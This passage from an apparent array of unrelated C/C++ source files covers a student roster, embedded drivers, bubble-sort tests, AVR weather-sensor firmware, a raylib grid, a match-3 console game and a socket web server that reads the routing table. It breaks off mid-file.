Roster::parseStudentInfo(string studentInfo) {\r\n    vector<string> info;\r\n    string element = \"\";\r\n    DegreeProgram inputDegree;\r\n\r\n    stringstream stream (studentInfo);\r\n    \r\n    while(getline(stream, element, ',')) {\r\n        info.push_back(element);\r\n    }\r\n\r\n    if (info[8] == \"SECURITY\") {\r\n        inputDegree = DegreeProgram::SECURITY;\r\n    } else if(info[8] == \"NETWORK\") {\r\n        inputDegree = DegreeProgram::NETWORK;\r\n    } else if(info[8] == \"SOFTWARE\") {\r\n        inputDegree = DegreeProgram::SOFTWARE;\r\n    }\r\n\r\n    this -> add(info[0], info[1], info[2], info[3], stoi(info[4]), stoi(info[5]), stoi(info[6]), \r\n        stoi(info[7]), inputDegree);\r\n}\r\n\r\nvoid Roster::ensureSize() {\r\n    // Do we have at least one array slot available for the next add?\r\n    // => numStudents == capacity\r\n    // => capacity *= 2 (or =1 if capacity is zero), then copy old data to new array\r\n\r\n    if (this->numStudents == this->capacity) {\r\n        // Grow to twice the size\r\n        int newCapacity = this->capacity == 0 ? 1 : this->capacity * 2;\r\n        Student** newArray = new Student*[newCapacity];\r\n\r\n        for (int i = 0; i < newCapacity; i++) {\r\n            if (i < this->numStudents) {\r\n                // Copy from old array\r\n                newArray[i] = this->classRosterArray[i];\r\n            } else {\r\n                // Initialize to null\r\n                newArray[i] = nullptr;\r\n            }\r\n        }\r\n\r\n        if (this->classRosterArray != nullptr) {\r\n            // Clean up the old array (but not the contents, because they were copied)\r\n            delete [] this->classRosterArray;\r\n        }\r\n\r\n        this->capacity = newCapacity;\r\n        this->classRosterArray = newArray;\r\n    }\r\n}\r\n",
    "#include \"drivers/driver_controller.hpp\"\n\n#include \"drivers/buttons.hpp\"\n#include \"drivers/driver_enums.hpp\"\n#include \"drivers/led_display.hpp\"\n#include \"drivers/timer.hpp\"\n\n#include <stdio.h>\n\nnamespace edge::drivers {\n// Runs on context switch\nvoid do_async_work()\n{\n    led_display.do_async_work();\n}\n\netl::optional<int> handle_command(DriverCommand type, int arg1, int arg2, int arg3)\n{\n    switch (type) {\n        case DriverCommand::LED_DISPLAY:\n            led_display.set_led(arg1, arg2, arg3);\n            break;\n        case DriverCommand::GET_TIME:\n            return timer4_controller.get_time_us();\n        case DriverCommand::TERMINAL_OUTPUT:\n            printf((char*)arg1);\n            break;\n        case DriverCommand::BUTTONS:\n            return button_controller.get_button_pressed(static_cast<ButtonType>(arg1));\n    }\n    return etl::nullopt;\n}\n\nvoid handle_subscribe(\n    DriverSubscribe type, SubscribeCallbackPtr callback, int arg1, int arg2,\n    uint8_t process_id\n)\n{\n    switch (type) {\n        case DriverSubscribe::NOTIFY_BUTTON_PRESS:\n            button_controller.subscribe_button_press(\n                static_cast<ButtonType>(arg1), callback, process_id\n            );\n            break;\n    }\n}\n\netl::optional<subscribe_callback> get_ready_callback(uint8_t process_id)\n{\n    return button_controller.get_ready_callback(process_id);\n}\n\n} // namespace edge::drivers\n",
    "#include \"../include/optimizedBubble.sort.h\"\n#include \"../libs/catch2/catch.hpp\"\n#include <vector>\n\nTEST_CASE(\"\u0422\u0435\u0441\u0442\u044b \u0434\u043b\u044f \u043e\u043f\u0442\u0438\u043c\u0438\u0437\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u043e\u0439 \u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u043a\u0438 \u043f\u0443\u0437\u044b\u0440\u044c\u043a\u043e\u043c\") {\n  int N = 5;\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0446\u0435\u043b\u044b\u0445 \u0447\u0438\u0441\u0435\u043b \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    int Array[5] = {2, 6, 5, 3, 9};\n    optimizedBubbleSort(Array, N);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] <= Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041f\u0443\u0441\u0442\u043e\u0439 \u043c\u0430\u0441\u0441\u0438\u0432 \u0446\u0435\u043b\u044b\u0445 \u0447\u0438\u0441\u0435\u043b\") {\n    int Array2[0] = {};\n    optimizedBubbleSort(Array2, 0);\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0447\u0438\u0441\u0435\u043b \u0441 \u043f\u043b\u0430\u0432\u0430\u044e\u0449\u0435\u0439 \u0437\u0430\u043f\u044f\u0442\u043e\u0439 \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    double Array3[5] = {2.3, 5.0, -1.0, 8.0, -20.0};\n    optimizedBubbleSort(Array3, N);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array3[i] <= Array3[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0446\u0435\u043b\u044b\u0445 \u0447\u0438\u0441\u0435\u043b \u043f\u043e \u0443\u0431\u044b\u0432\u0430\u043d\u0438\u044e\") {\n    int Array[5] = {2, 6, 5, 3, 9};\n    optimizedBubbleSort(Array, N, false);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] >= Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0447\u0438\u0441\u0435\u043b \u0441 \u043f\u043b\u0430\u0432\u0430\u044e\u0449\u0435\u0439 \u0437\u0430\u043f\u044f\u0442\u043e\u0439 \u043f\u043e \u0443\u0431\u044b\u0432\u0430\u043d\u0438\u044e\") {\n    double Array3[5] = {2.3, 5.0, -1.0, 8.0, -20.0};\n    optimizedBubbleSort(Array3, N, false);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array3[i] >= Array3[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0438\u0437 \u043e\u0434\u043d\u043e\u0433\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\") {\n    int Array[1] = {42};\n    optimizedBubbleSort(Array, 1);\n    REQUIRE(Array[0] == 42);\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0441 \u0434\u0443\u0431\u043b\u0438\u043a\u0430\u0442\u0430\u043c\u0438 \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    int Array[5] = {5, 3, 5, 1, 3};\n    optimizedBubbleSort(Array, N);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] <= Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0441 \u0443\u0436\u0435 \u043e\u0442\u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u043c\u0438 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\u043c\u0438 \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    int Array[5] = {1, 2, 3, 4, 5};\n    optimizedBubbleSort(Array, N);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] <= Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0441 \u043e\u0434\u0438\u043d\u0430\u043a\u043e\u0432\u044b\u043c\u0438 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\u043c\u0438\") {\n    int Array[5] = {5, 5, 5, 5, 5};\n    optimizedBubbleSort(Array, N);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] == Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0441 \u043e\u0442\u0440\u0438\u0446\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u043c\u0438 \u0447\u0438\u0441\u043b\u0430\u043c\u0438 \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    int Array[5] = {-3, -1, -7, -5, -2};\n    optimizedBubbleSort(Array, N);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] <= Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041e\u0447\u0435\u043d\u044c \u0431\u043e\u043b\u044c\u0448\u043e\u0439 \u043c\u0430\u0441\u0441\u0438\u0432 \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    int              largeN = 100000;\n    std::vector<int> LargeArray(largeN);\n\n    for (int i = 0; i < largeN; ++i) {\n      LargeArray[i] = largeN - i;\n    }\n\n    optimizedBubbleSort(LargeArray.data(), largeN);\n\n    for (int i = 0; i < largeN - 1; i++) {\n      REQUIRE(LargeArray[i] <= LargeArray[i + 1]);\n    }\n  }\n}\n",
    "//the code reads the values of light and force to trigger a command of shutting the door close when needed only once in every storm.\r\n\r\n#define F_CPU 8000000UL\r\n#include <stdio.h>\r\n#include <avr/io.h>\r\n#include <util/delay.h>\r\n\r\nvoid initUART ()\r\n{            \r\n\tUBRRH = 0 ; // high byte of UBRR\r\n\tUBRRL = 103 ;// low byte of UBRR\r\n\tUCSRC = 0x86 ;// Mode\r\n\tUCSRB = 0x18 ;// enable RX and TX\r\n}\r\n\r\nvoid sendByte(char x)\r\n{\r\n   while((UCSRA & 0x20) == 0)\t;\r\n\tUDR = x;\r\n}\r\n\r\n\r\nvoid print_decimal(unsigned char x)\r\n{\r\n\tchar h, t;\r\n\th = x / 100;\r\n\tx = x - h * 100;\r\n\tt = x / 10;\r\n\tx = x - t * 10;\r\n\tif (h > 0) {\r\n\t\tsendByte(h + '0');\r\n\t\tsendByte(t + '0');\r\n\t\tsendByte(x + '0');\r\n\t\t} else if (t > 0) {\r\n\t\tsendByte(t + '0');\r\n\t\tsendByte(x + '0');\r\n\t} else\r\n\tsendByte(x + '0');\r\n}\r\n\r\n\r\nvoid print_string(char *s)\r\n{\r\n\tint i;\r\n\tfor (i = 0; s[i] != '\\0'; i++)\r\n\tsendByte(s[i]);\r\n}\r\n\r\n\r\nvoid print_newline()\r\n{\r\n\tsendByte(10);\r\n\tsendByte(13);\r\n}\r\n\r\nint main()\r\n{\r\n\tunsigned char force;\r\n\tunsigned char light;\r\n        DDRB= 0XFF;\r\n\t\r\n    initUART();\r\n\t\r\n\t\r\n\twhile (1)\r\n\t{\r\n\t\r\n\t//read the force value\r\n\tADCSRA = 0x86;\r\n        ADMUX = 0x20;\r\n        ADCSRA |= (1 << ADSC);\r\n        while ((ADCSRA & (1 << ADIF)) == 0);\r\n        force = ADCH;\r\n\t\r\n\t//read the light value\r\n\tADCSRA=0x86; \r\n\tADMUX=0x25 ;   //left j, 00 ref, ADC5\r\n\tADCSRA |= (1<<ADSC);\t//  start the conversion\r\n\twhile((ADCSRA&(1<<ADIF))==0);\t//  wait until conversion is completed\r\n\t\tlight = ADCH ;\r\n\t\t\r\n\r\n\t   /*print_string(\"light = \");\r\n\t   print_decimal(light);\r\n\t   print_newline();\r\n\t   print_string(\"force = \");\r\n\t   print_decimal(force);\r\n\t   print_newline(); \r\n\t   */\r\n\t\r\n\tif (force<70)  //effecint for night rain \r\n\t{ PORTB  |= (1<<0);\r\n\t   print_string(\"it's raining outside! \");\r\n\t\tprint_newline();\r\n\t\tprint_string(\"approximatly the precipitation rate is:\");\r\n\t   print_decimal(force*7.143);\r\n\t   print_newline();\r\n\t   _delay_ms(5000);\r\n\t   PORTB  &=~ (1<<0);\r\n\t   while (force > 70) {\r\n  // Read the force value again inside the loop\r\n  ADCSRA = 0x86;\r\n  ADMUX = 0x20;\r\n  ADCSRA |= (1 << ADSC);\r\n  while ((ADCSRA & (1 << ADIF)) == 0);\r\n  force = ADCH;\r\n};\r\n\t   }\r\n\t else if  ((force<100)&&(light>40)&&(light<200)) //for day time and predicting the clouds and gloomy windy weather\r\n\t{\r\n\t   PORTB  |= (1<<0);\r\n\t   print_string(\"the weather is gloomy outside! \");\r\n\t\tprint_newline();\r\n\t   _delay_ms(5000);\r\n\t   PORTB  &=~ (1<<0);\r\n\t   \r\n\t   \r\n\t   while((force<100)&&(light>40)&&(light<200))\r\n\t   \r\n\t   \r\n  // Read the force,light value again inside the loop\r\n { ADCSRA = 0x86;\r\n  ADMUX = 0x20;\r\n  ADCSRA |= (1 << ADSC);\r\n  while ((ADCSRA & (1 << ADIF)) == 0);\r\n  force = ADCH;\r\n  \r\n  ADCSRA=0x86; \r\nADMUX=0x25 ;   //left j, 00 ref, ADC5\r\nADCSRA |= (1<<ADSC);\t//  start the conversion\r\nwhile((ADCSRA&(1<<ADIF))==0);\t//  wait until conversion is completed\r\nlight = ADCH ; };\r\n\r\n\t   }\r\n\t\r\n\t\t\t\r\n\t}\r\n\treturn 0;\r\n}\r\n",
    "#include \"Grid.h\"\n\n#include <raylib.h>\n\n#include <utility>\n\nGrid::Grid(int width, int height, int cellSize)\n\t: m_Rows{ height / cellSize },\n\tm_Columns{ width / cellSize },\n\tm_CellSize{ cellSize },\n\tm_Cells(m_Rows, std::vector<int>(m_Columns, 0))\n{}\n\nvoid Grid::Draw()\n{\n\tfor (int row = 0; row < m_Rows; row++)\n\t{\n\t\tfor (int column = 0; column < m_Columns; column++)\n\t\t{\n\t\t\tColor color = m_Cells[row][column] ? Color{ 0, 255, 0, 255 } : Color{ 70, 70, 70, 255 };\n\t\t\tDrawRectangle(column * m_CellSize, row * m_CellSize, m_CellSize - 1, m_CellSize - 1, color);\n\t\t}\n\t}\n}\n\nvoid Grid::SetValue(int row, int column, int value)\n{\n\tif (IsWithinBounds(row, column))\n\t{\n\t\tm_Cells[row][column] = value;\n\t}\n}\n\nint Grid::GetValue(int row, int column)\n{\n\tif (IsWithinBounds(row, column))\n\t{\n\t\treturn m_Cells[row][column];\n\t}\n\n\treturn 0;\n}\n\nbool Grid::IsWithinBounds(int row, int column)\n{\n\tif (row >= 0 && row < m_Rows &&\n\t\tcolumn >= 0 && column < m_Columns)\n\t{\n\t\treturn true;\n\t}\n\n\treturn false;\n}\n\nvoid Grid::FillRandom()\n{\n\tfor (int row = 0; row < m_Rows; row++)\n\t{\n\t\tfor (int column = 0; column < m_Columns; column++)\n\t\t{\n\t\t\tint randomValue = GetRandomValue(0, 4);\n\t\t\tm_Cells[row][column] = (randomValue == 4) ? 1 : 0;\n\t\t}\n\t}\n}\n\nvoid Grid::Clear()\n{\n\tfor (int row = 0; row < m_Rows; row++)\n\t{\n\t\tfor (int column = 0; column < m_Columns; column++)\n\t\t{\n\t\t\tm_Cells[row][column] = 0;\n\t\t}\n\t}\n}\n\nvoid Grid::ToggleCell(int row, int column)\n{\n\tif (IsWithinBounds(row, column))\n\t\tm_Cells[row][column] = !m_Cells[row][column];\n}\n",
    "\ufeff#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\n#include <iomanip>\n#include <Windows.h>\n#include <stdio.h>  \n#include <stdlib.h>  \n#include <conio.h>  \n#include <math.h>\n#include <time.h>\n#include \"../include/cmd_console_tools.h\"\n#include \"../include/cmd_gmw_tools.h\"\nusing namespace std;\n#define NORMAL_STATE       1\n#define RELATED_STATE      2\n#define SELECTED_STATE     3\n#define BONUS              10\n\nstruct elem\n{\n\tint key;\n\tint state;//1:\u539f\u59cb\u72b6\u6001;2:\u5173\u8054\u72b6\u6001\uff08\u9009\u4e2d\u533a\u57df\uff09;3:\u9009\u4e2d\u72b6\u6001\uff081\u6b21\u56de\u8f66\u540e\uff09\n};\n\ntypedef struct a\n{\n\tint mat[9][9];\n\tint x = 0;\t//\u884c\u6570\n\tint y = 0;\t//\u5217\u6570\n}Matrix;\n\nvoid setMatrixSize(Matrix& matrix)\n{\n\twhile (true)\n\t{\n\t\tcout << \"\u8bf7\u8f93\u5165\u884c\u6570\uff085-9\uff09\uff1a\";\n\t\tcin >> matrix.x;\n\t\tcout << \"\u8bf7\u8f93\u5165\u5217\u6570\uff085-9\uff09\uff1a\";\n\t\tcin >> matrix.y;\n\t\tif (matrix.x >= 5 && matrix.y >= 5 && matrix.x <= 9 && matrix.y <= 9)\n\t\t\treturn;\n\t\telse\n\t\t\tcout << \"\u9519\u8bef\u7684\u8f93\u5165\\n\";\n\t}\n}\n\nvoid fillEmptySlots(CONSOLE_GRAPHICS_INFO& CGI, Matrix& matrix)\n{\n\tconst BLOCK_DISPLAY_INFO bdi_normal[] =\n\t{\n\t{BDI_VALUE_BLANK, -1, -1, \"  \"},  //0\u4e0d\u663e\u793a\uff0c\u7528\u7a7a\u683c\u586b\u5145\u5373\u53ef\n\t{1, COLOR_HBLACK, -1, \"\u3007\"},\n\t{2, COLOR_YELLOW, -1, \"\u3007\"},\n\t{3, COLOR_HGREEN, -1, \"\u3007\"},\n\t{4, COLOR_HCYAN, -1, \"\u3007\"},\n\t{5, COLOR_HRED, -1, \"\u3007\"},\n\t{6, COLOR_HPINK, -1, \"\u3007\"},\n\t{7, COLOR_HYELLOW, -1, \"\u3007\"},\n\t{8, COLOR_CYAN, -1, \"\u3007\"},\n\t{9, COLOR_WHITE, -1, \"\u3007\"},\n\t{BDI_VALUE_END, -1, -1, NULL} //\u5224\u65ad\u7ed3\u675f\u6761\u4ef6\u4e3a-999\n\t};\n\n\tif (matrix.x < 5) matrix.x = 5;\n\tif (matrix.x > 9) matrix.x = 9;\n\tif (matrix.y < 5) matrix.y = 5;\n\tif (matrix.y > 9) matrix.y = 9;\n\tsrand(time(0));\n\tfor (int i = 0; i < matrix.x; i++)\n\t{\n\t\tfor (int j = 0; j < matrix.y; j++)\n\t\t\tif (matrix.mat[i][j] == 0)\n\t\t\t{\n\t\t\t\tmatrix.mat[i][j] = rand() % 9 + 1;\n\t\t\t\tgmw_draw_block(&CGI, i, j, matrix.mat[i][j], bdi_normal);\n\t\t\t}\n\t}\n}\n\nvoid findElimination(const Matrix& matrix, Matrix& tempMatrix)\n{\n\t// \u521d\u59cb\u5316tempMatrix.mat\u4e3a0\n\ttempMatrix.x = matrix.x;\n\ttempMatrix.y = matrix.y;\n\tfor (int i = 0; i < tempMatrix.x; i++)\n\t\tfor (int j = 0; j < tempMatrix.y; j++)\n\t\t\ttempMatrix.mat[i][j] = 0;\n\n\t// \u68c0\u67e5\u6a2a\u5411\u662f\u5426\u6709\u8d85\u8fc73\u4e2a\u8fde\u7eed\u76f8\u540c\u7684\u6570\u5b57\n\tfor (int i = 0; i < 9; ++i)\n\t{\n\t\tfor (int j = 0; j < 7; ++j)\n\t\t{\n\t\t\tif (matrix.mat[i][j] == matrix.mat[i][j + 1] && matrix.mat[i][j] == matrix.mat[i][j + 2])\n\t\t\t{\n\t\t\t\ttempMatrix.mat[i][j] = 1;\n\t\t\t\ttempMatrix.mat[i][j + 1] = 1;\n\t\t\t\ttempMatrix.mat[i][j + 2] = 1;\n\t\t\t}\n\t\t}\n\t}\n\n\t// \u68c0\u67e5\u7eb5\u5411\u662f\u5426\u6709\u8d85\u8fc73\u4e2a\u8fde\u7eed\u76f8\u540c\u7684\u6570\u5b57\n\tfor (int j = 0; j < 9; ++j)\n\t{\n\t\tfor (int i = 0; i < 7; ++i)\n\t\t{\n\t\t\tif (matrix.mat[i][j] == matrix.mat[i + 1][j] && matrix.mat[i][j] == matrix.mat[i + 2][j])\n\t\t\t{\n\t\t\t\ttempMatrix.mat[i][j] = 1;\n\t\t\t\ttempMatrix.mat[i + 1][j] = 1;\n\t\t\t\ttempMatrix.mat[i + 2][j] = 1;\n\t\t\t}\n\t\t}\n\t}\n}\n\nint eliminateElimination(const CONSOLE_GRAPHICS_INFO& CGI, Matrix& matrix, Matrix& tempMatrix)\n{\n\tconst BLOCK_DISPLAY_INFO bdi_normal[] =\n\t{\n\t{BDI_VALUE_BLANK, -1, -1, \"  \"},  //0\u4e0d\u663e\u793a\uff0c\u7528\u7a7a\u683c\u586b\u5145\u5373\u53ef\n\t{1, COLOR_HBLACK, -1, \"\u3007\"},\n\t{2, COLOR_YELLOW, -1, \"\u3007\"},\n\t{3, COLOR_HGREEN, -1, \"\u3007\"},\n\t{4, COLOR_HCYAN, -1, \"\u3007\"},\n\t{5, COLOR_HRED, -1, \"\u3007\"},\n\t{6, COLOR_HPINK, -1, \"\u3007\"},\n\t{7, COLOR_HYELLOW, -1, \"\u3007\"},\n\t{8, COLOR_CYAN, -1, \"\u3007\"},\n\t{9, COLOR_WHITE, -1, \"\u3007\"},\n\t{BDI_VALUE_END, -1, -1, NULL} //\u5224\u65ad\u7ed3\u675f\u6761\u4ef6\u4e3a-999\n\t};\n\n\tint cnt = 0;\n\tfor (int i = 0; i < matrix.x; ++i)\n\t{\n\t\tfor (int j = 0; j < matrix.y; ++j)\n\t\t{\n\t\t\tif (tempMatrix.mat[i][j])\n\t\t\t{\n\t\t\t\tgmw_draw_block(&CGI, i, j, BDI_VALUE_BLANK, bdi_normal);\n\t\t\t\t++cnt;\n\t\t\t\ttempMatrix.mat[i][j] = 0;\n\t\t\t\tmatrix.mat[i][j] = 0;\n\t\t\t}\n\t\t}\n\t}\n\treturn cnt;\n}\n\nvoid fallTheBall(CONSOLE_GRAPHICS_INFO& CGI, Matrix& matrix)\n{\n\tconst BLOCK_DISPLAY_INFO bdi_normal[] =\n\t{\n\t{BDI_VALUE_BLANK, -1, -1, \"  \"},  //0\u4e0d\u663e\u793a\uff0c\u7528\u7a7a\u683c\u586b\u5145\u5373\u53ef\n\t{1, COLOR_HBLACK, -1, \"\u3007\"},\n\t{2, COLOR_YELLOW, -1, \"\u3007\"},\n\t{3, COLOR_HGREEN, -1, \"\u3007\"},\n\t{4, COLOR_HCYAN, -1, \"\u3007\"},\n\t{5, COLOR_HRED, -1, \"\u3007\"},\n\t{6, COLOR_HPINK, -1, \"\u3007\"},\n\t{7, COLOR_HYELLOW, -1, \"\u3007\"},\n\t{8, COLOR_CYAN, -1, \"\u3007\"},\n\t{9, COLOR_WHITE, -1, \"\u3007\"},\n\t{BDI_VALUE_END, -1, -1, NULL} //\u5224\u65ad\u7ed3\u675f\u6761\u4ef6\u4e3a-999\n\t};\n\n\tfor (int t = 0; t < matrix.x; ++t)\n\t{\n\t\tfor (int i = 0; i < matrix.x - 1; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < matrix.y; j++)\n\t\t\t\tif (matrix.mat[i + 1][j] == 0 && matrix.mat[i][j] != 0)\n\t\t\t\t{\n\t\t\t\t\tgmw_move_block(&CGI, i, j, matrix.mat[i][j], 0, bdi_normal, UP_TO_DOWN, 1);\n\t\t\t\t\tswap(matrix.mat[i][j], matrix.mat[i + 1][j]);\n\t\t\t\t\tgmw_draw_block(&CGI, i, j, BDI_VALUE_BLANK, bdi_normal);\n\t\t\t\t}\n\t\t}\n\t}\n}\n\nbool checkSwap(Matrix& matrix, int x, int y, int dx, int dy)\n{\n\tswap(matrix.mat[x][y], matrix.mat[x + dx][y + dy]);\n\n\tbool horizontalMatch = (y >= 2 && matrix.mat[x][y] == matrix.mat[x][y - 1] && matrix.mat[x][y] == matrix.mat[x][y - 2]) ||\n\t\t(y <= 6 && matrix.mat[x][y] == matrix.mat[x][y + 1] && matrix.mat[x][y] == matrix.mat[x][y + 2]) ||\n\t\t(y >= 1 && y <= 7 && matrix.mat[x][y] == matrix.mat[x][y - 1] && matrix.mat[x][y] == matrix.mat[x][y + 1]);\n\tbool verticalMatch = (x >= 2 && matrix.mat[x][y] == matrix.mat[x - 1][y] && matrix.mat[x][y] == matrix.mat[x - 2][y]) ||\n\t\t(x <= 6 && matrix.mat[x][y] == matrix.mat[x + 1][y] && matrix.mat[x][y] == matrix.mat[x + 2][y]) ||\n\t\t(x >= 1 && x <= 7 && matrix.mat[x][y] == matrix.mat[x - 1][y] && matrix.mat[x][y] == matrix.mat[x + 1][y]);\n\n\tswap(matrix.mat[x][y], matrix.mat[x + dx][y + dy]);\n\n\tretu",
    "\ufeff// SPI_WEBSERVER.cpp : Defines the entry point for the application.\r\n//\r\n\r\n#include \"server.h\"\r\n\r\n#include <array>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\n#include <iostream>\r\n#include <cstring>\r\n#include <unistd.h>\r\n#include <arpa/inet.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n\r\n\r\nvoid client(int socket);\r\n\r\nint main()\r\n{\r\n\tint server_socket;\r\n\tstruct sockaddr_in address;\r\n\tint opt = 1;\r\n\tsocklen_t addrlen = sizeof(address);\r\n\r\n\tif ((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == 0)\r\n\t{\r\n\t\tperror(\"socket failed\");\r\n\t\texit(EXIT_FAILURE);\r\n\t}\r\n\r\n\tif (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)))\r\n\t{\r\n\t\tperror(\"setsockopt failed\");\r\n\t\texit(EXIT_FAILURE);\r\n\t}\r\n\r\n\taddress.sin_family = AF_INET;\r\n\taddress.sin_addr.s_addr = INADDR_ANY;\r\n\taddress.sin_port = htons(8080);\r\n\r\n\tif (bind(server_socket, (sockaddr*)&address, addrlen) < 0)\r\n\t{\r\n\t\tperror(\"bind failed\");\r\n\t\texit(EXIT_FAILURE);\r\n\t}\r\n\r\n\tconstexpr int max_queued_connections = 3;\r\n\tif (listen(server_socket, max_queued_connections) < 0)\r\n\t{\r\n\t\tperror(\"listen failed\");\r\n\t\texit(EXIT_FAILURE);\r\n\t}\r\n\r\n\twhile (true)\r\n\t{\r\n\t\tint new_socket;\r\n\r\n\t\tif ((new_socket = accept(server_socket, (sockaddr*)&address, &addrlen)) < 0)\r\n\t\t{\r\n\t\t\tperror(\"accept failed\");\r\n\t\t\texit(EXIT_FAILURE);\r\n\t\t}\r\n\r\n\t\tif (fork() == 0)\r\n\t\t{\r\n\t\t\tclose(server_socket);\r\n\t\t\tclient(new_socket);\r\n\t\t\texit(0);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tclose(new_socket);\r\n\t\t}\r\n\t}\r\n\r\n\treturn 0;\r\n}\r\n\r\nstruct route_entry\r\n{\r\n\tstd::string interface;\r\n\tunsigned long dest;\r\n\tunsigned long gateway;\r\n\tunsigned short flags;\r\n\tunsigned short ref_count;\r\n\tunsigned short use;\r\n\tunsigned short metric;\r\n\tunsigned long mask;\r\n\tunsigned long mtu;\r\n\tunsigned short window;\r\n\tunsigned short irtt;\r\n};\r\n\r\nstd::vector<route_entry> parse_route_file()\r\n{\r\n\tstd::fstream f;\r\n\tf.open(\"/proc/net/route\", ios::in);\r\n\r\n\tif (!f.is_open())\r\n\t\treturn {};\r\n\r\n\tvector<route_entry> entries;\r\n\r\n\tstd::string line;\r\n\t//skip first line\r\n\tstd::getline(f, line);\r\n\r\n\twhile (f)\r\n\t{\r\n\t\tstd::getline(f, line);\r\n\t\tif (line.empty())\r\n\t\t\tcontinue;\r\n\r\n\t\tstd::stringstream s = std::stringstream(line);\r\n\t\tusing namespace std;\r\n\t\troute_entry e;\r\n\r\n\t\ts >> e.interface;\r\n\t\ts >> hex >> e.dest;\r\n\t\ts >> hex >> e.gateway;\r\n\t\ts >> dec >> e.flags;\r\n\t\ts >> dec >> e.ref_count;\r\n\t\ts >> dec >> e.use;\r\n\t\ts >> dec >> e.metric;\r\n\t\ts >> hex >> e.mask;\r\n\t\ts >> dec >> e.mtu;\r\n\t\ts >> dec >> e.window;\r\n\t\ts >> dec >> e.irtt;\r\n\t\tentries.push_back(e);\r\n\t}\r\n\treturn entries;\r\n}\r\n\r\n\r\n// flags\r\nenum RouteFlag {\r\n    RTF_UP = 0x0001,        // route usable\r\n    RTF_GATEWAY = 0x0002,   // destination is a gateway\r\n    RTF_HOST = 0x0004,      // host entry (net otherwise)\r\n    RTF_REINSTATE = 0x0008, // reinstate route after tmout\r\n    RTF_DYNAMIC = 0x0010,   // created dyn. (by redirect)\r\n    RTF_MODIFIED = 0x0020,  // modified dyn. (by redirect)\r\n    RTF_MTU = 0x0040,       // specific MTU for this route\r\n    RTF_MSS = RTF_MTU,      // Compatibility :-(\r\n    RTF_WINDOW = 0x0080,    // per route window clamping\r\n    RTF_IRTT = 0x0100,      // Initial round trip time\r\n    RTF_REJECT = 0x0200     // Reject route\r\n};\r\n\r\n\r\n// Array of flag names corresponding to the defined flags\r\nstd::array<std::string, 11> flags = {\r\n\t\"RTF_UP\",\r\n\t\"RTF_GATEWAY\",\r\n\t\"RTF_HOST\",\r\n\t\"RTF_REINSTATE\",\r\n\t\"RTF_DYNAMIC\",\r\n\t\"RTF_MODIFIED\",\r\n\t\"RTF_MTU\",\r\n\t\"RTF_MSS\",\r\n\t\"RTF_WINDOW\",\r\n\t\"RTF_IRTT\",\r\n\t\"RTF_REJECT\"\r\n};\r\n\r\n// Array of descriptions for each flag\r\nstd::array<std::string, 11> flags_descriptions = {\r\n\t\"Route is usable.\",\r\n\t\"Destination is a gateway.\",\r\n\t\"Host entry (network otherwise).\",\r\n\t\"Reinstate route after timeout.\",\r\n\t\"Created dynamically (by redirect).\",\r\n\t\"Modified dynamically (by redirect).\",\r\n\t\"Specific MTU for this route.\",\r\n\t\"MSS (Maximum Segment Size), compatibility.\",\r\n\t\"Per route window clamping.\",\r\n\t\"Initial round trip time.\",\r\n\t\"Reject route.\"\r\n};\r\n\r\n\r\nstd::string intToIP(unsigned long ip)\r\n{\r\n\tstd::string result;\r\n\tresult += std::to_string(ip & 0xFF);\r\n\tresult += \".\";\r\n\tresult += std::to_string((ip >> 8) & 0xFF);\r\n\tresult += \".\";\r\n\tresult += std::to_string((ip >> 16) & 0xFF);\r\n\tresult += \".\";\r\n\tresult += std::to_string((ip >> 24) & 